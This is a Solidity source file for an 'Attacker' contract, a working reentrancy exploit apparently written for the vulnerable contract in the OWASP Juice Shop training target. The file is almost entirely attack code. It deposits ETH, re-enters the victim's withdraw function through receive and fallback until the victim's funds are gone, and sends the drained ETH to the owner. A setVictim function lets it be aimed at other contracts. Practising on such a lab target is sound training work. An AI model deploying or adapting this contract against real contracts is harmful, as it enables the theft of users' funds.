// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {IVictim} from "./interfaces/IVictim.sol";

/// @title Attacker
/// @notice Reentrancy exploit for the OWASP Juice Shop vulnerable contract.
/// @dev    The victim violates Checks-Effects-Interactions: it sends ETH via
///         an external call BEFORE updating the caller's balance. The broken
///         guard (`unknownac7ea680`) increments before the call but resets
///         after, so it never blocks reentry during the same call frame.
///
///         Attack flow:
///           1. depositToVictim()   — establish a balance in the victim
///           2. exploit(amount)     — trigger withdraw; fallback re-enters
///           3. withdraw()          — move drained ETH to owner EOA
contract Attacker {
    // -----------------------------------------------------------------
    // Errors
    // -----------------------------------------------------------------
    error NotOwner();
    error DepositFailed();
    error ExploitFailed();
    error WithdrawFailed();
    error InvalidAddress();
    error InsufficientDeposit();

    // -----------------------------------------------------------------
    // Events — emitted at every phase for on-chain forensics
    // -----------------------------------------------------------------
    event Deposited(uint256 amount, address indexed beneficiary);
    event ExploitStarted(uint256 withdrawAmount, uint256 victimBalance);
    event Reentry(uint256 count, uint256 victimBalance);
    event ExploitCompleted(uint256 totalDrained);
    event Withdrawn(address indexed to, uint256 amount);

    // -----------------------------------------------------------------
    // State
    // -----------------------------------------------------------------
    IVictim public victim;
    address private immutable owner;

    /// @dev Amount used for each reentrant withdraw call.
    uint256 private withdrawAmount;

    /// @dev Tracks how many times the fallback has re-entered.
    uint256 public reentryCount;

    // -----------------------------------------------------------------
    // Constructor
    // -----------------------------------------------------------------
    /// @param _victim Address of the vulnerable contract.
    constructor(address _victim) {
        owner = msg.sender;
        victim = IVictim(_victim);
    }

    // -----------------------------------------------------------------
    // Modifiers
    // -----------------------------------------------------------------
    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    // -----------------------------------------------------------------
    // Reentrancy callback
    //
    // When the victim sends ETH with empty calldata (via .call{value}),
    // receive() is invoked.  fallback() catches calls with non-empty
    // calldata.  Both trigger reentry so the exploit works regardless
    // of how the victim transfers ETH.
    //
    // Recursion continues until the victim's balance drops below the
    // withdrawal amount — no fixed counter needed.
    // -----------------------------------------------------------------
    receive() external payable {
        _reenter();
    }

    fallback() external payable {
        _reenter();
    }

    function _reenter() internal {
        reentryCount++;
        emit Reentry(reentryCount, address(victim).balance);

        // Continue reentering while:
        //   - victim still has funds to drain
        //   - enough gas remains for another withdraw round-trip (~50k min)
        if (address(victim).balance >= withdrawAmount && gasleft() > 50_000) {
            victim.withdraw(withdrawAmount);
        }
    }

    // -----------------------------------------------------------------
    // Deposit ETH into the victim so this contract has a balance to
    // withdraw from during the exploit.
    // -----------------------------------------------------------------
    function depositToVictim() external payable onlyOwner {
        if (msg.value == 0) revert InsufficientDeposit();

        victim.ethdeposit{value: msg.value}(address(this));
        emit Deposited(msg.value, address(this));
    }

    // -----------------------------------------------------------------
    // Trigger the reentrancy exploit.
    // @param _amount  The withdrawal amount per reentrant call.
    //                 Must match (or be <=) the balance this contract
    //                 holds inside the victim.
    // -----------------------------------------------------------------
    function exploit(uint256 _amount) external onlyOwner {
        withdrawAmount = _amount;
        reentryCount = 0;

        emit ExploitStarted(_amount, address(victim).balance);

        victim.withdraw(_amount);

        emit ExploitCompleted(address(this).balance);
    }

    // -----------------------------------------------------------------
    // Convenience: deposit + exploit in a single transaction.
    // -----------------------------------------------------------------
    function depositAndExploit() external payable onlyOwner {
        if (msg.value == 0) revert InsufficientDeposit();

        // Deposit
        victim.ethdeposit{value: msg.value}(address(this));
        emit Deposited(msg.value, address(this));

        // Exploit using the deposited amount as the per-call withdrawal
        withdrawAmount = msg.value;
        reentryCount = 0;

        emit ExploitStarted(msg.value, address(victim).balance);

        victim.withdraw(msg.value);

        emit ExploitCompleted(address(this).balance);
    }

    // -----------------------------------------------------------------
    // Withdraw all drained ETH to the owner's EOA.
    // -----------------------------------------------------------------
    function withdraw() external onlyOwner {
        uint256 bal = address(this).balance;
        (bool success,) = payable(owner).call{value: bal}("");
        if (!success) revert WithdrawFailed();
        emit Withdrawn(owner, bal);
    }

    // -----------------------------------------------------------------
    // Admin: update the victim address (e.g. after a challenge reset).
    // -----------------------------------------------------------------
    function setVictim(address _victim) external onlyOwner {
        if (_victim == address(0)) revert InvalidAddress();
        victim = IVictim(_victim);
    }

    // -----------------------------------------------------------------
    // View helpers
    // -----------------------------------------------------------------
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getOwner() external view returns (address) {
        return owner;
    }
}
